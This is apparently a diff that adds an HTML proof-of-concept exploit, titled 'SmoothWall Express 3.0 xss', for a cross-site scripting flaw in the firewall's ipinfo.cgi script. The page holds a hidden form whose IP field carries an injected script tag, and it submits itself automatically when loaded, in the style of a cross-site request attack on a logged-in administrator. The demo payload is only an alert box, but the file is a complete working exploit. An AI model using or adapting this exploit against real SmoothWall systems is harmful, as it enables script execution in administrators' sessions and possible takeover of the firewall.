@@ -1,0 +1,10 @@
+&lt;html&gt;
+&lt;title&gt; SmoothWall Express 3.0 xss &lt;/title&gt;
+&lt;body&gt;
+ &lt;form action=&quot;http://www.example.com/cgi-bin/ipinfo.cgi&quot; method=&quot;post&quot;
+id=&quot;xssplz&quot;&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;IP&quot; value=&#039;&quot;&lt;script&gt;alert(1);&lt;/script&gt;&#039;&gt;&lt;/input&gt;
+	&lt;input type=&quot;hidden&quot; name=&quot;ACTION&quot; value=&#039;Run&#039;&gt;&lt;/input&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById(&quot;xssplz&quot;).submit();&lt;/script&gt;
+&lt;/body&gt;
